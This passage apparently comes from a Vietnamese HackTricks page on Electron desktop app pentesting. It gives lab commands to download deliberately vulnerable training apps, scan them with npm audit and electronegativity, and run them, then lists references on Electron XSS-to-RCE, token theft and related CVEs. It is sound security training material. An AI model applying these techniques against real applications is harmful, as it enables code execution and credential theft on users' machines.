Tại [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s), bạn có thể tìm thấy một bài thực hành khai thác ứng dụng Electron dễ bị tấn công.<sup>[[4]](#references)</sup>

Các lệnh sau giúp bạn thực hiện bài thực hành:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Địa chỉ đã xuất bản trước đây dành cho dấu trang hiện có: [Ứng dụng desktop Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Tuyến dẫn đến toàn bộ trang sẽ chuyển hướng đến đây; fragment lịch sử không được duy trì.

## References

- [1] [Phishing và thu thập thông tin xác thực trong ứng dụng Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Đọc file tùy ý trong ứng dụng Facebook Messenger Desktop](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Lợi dụng việc thiếu context isolation - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Workshop về hacking ứng dụng desktop hiện đại bằng XSS và RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - danh sách tài nguyên được tuyển chọn về bảo mật (và thiếu bảo mật) của Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Lạm dụng Electron APIs: Lựa chọn hàng đầu của attacker](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payload RCE cho Electron nodeIntegration](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE chỉ với 1 lần nhấp trong ứng dụng Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Mối nguy từ shell.openExternal() của Electron - nhiều con đường dẫn đến thực thi mã từ xa](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Cho phép URL tùy ý, hãy sẵn sàng cho việc thực thi mã tùy ý](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Đạt được RCE trong công cụ chat nổi tiếng của Nhật Bản bằng một tính năng Electron lỗi thời](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Thực thi mã từ xa](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Thực thi mã từ xa trong Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Đánh cắp GitHub Token chỉ với một lần nhấp thông qua chèn sự kiện bàn phím vào VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Vấn đề VS Code #319593: Webview có thể kích hoạt phím tắt tùy ý trong workbench chính](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705: xác nhận việc mở notebook và ngừng chấp nhận context installExtension do caller cung cấp](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813: chặn việc phát lại sự kiện nhấn phím/nhấp chuột từ webview bằng chương trình trong notebook webview](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / extension trong workspace cục bộ](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Cách tôi hack mọi IDE lớn chỉ trong 2 tuần](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Chiếm quyền kiểm soát các ứng dụng desktop phổ biến và khám phá bề mặt tấn công mới trên Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Bảo mật Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Các tùy chọn webPreferences của Electron BrowserWindow](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Reverse Engineer Anything](https://github.com/morluto/rea)
- [24] [Tái dựng artifact JavaScript bằng REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Quy trình ứng dụng JavaScript nhiều lớp bằng REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
